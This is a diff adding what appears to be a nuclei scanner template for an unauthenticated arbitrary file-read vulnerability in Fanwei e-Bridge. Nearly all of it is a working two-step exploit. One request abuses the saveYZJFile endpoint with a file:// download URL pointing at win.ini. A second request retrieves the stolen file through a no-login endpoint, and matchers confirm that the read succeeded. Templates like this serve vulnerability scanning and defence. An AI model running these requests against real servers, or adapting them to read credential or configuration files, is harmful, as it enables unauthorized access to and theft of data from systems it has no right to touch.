@@ -1,0 +1,39 @@
+id: FanweieBridge_saveYZJFile_FileRead
+info:
+  name: 泛微e-Bridge-saveYZJFile-未授权文件读取漏洞
+  author: mhb17
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: fileread
+requests:
+  - raw:
+      - |-
+        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+      - |+
+        GET /file/fileNoLogin/{{endpoint}} HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+    iterate-all: true
+    extractors:
+      - part: body
+        name: endpoint
+        internal: true
+        type: json
+        json:
+          - '.["id"]'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'contains((body_2), "bit app support") && status_code_2 == 200'
+          - 'contains((body_1), "filepath") && status_code_1 == 200'
+          
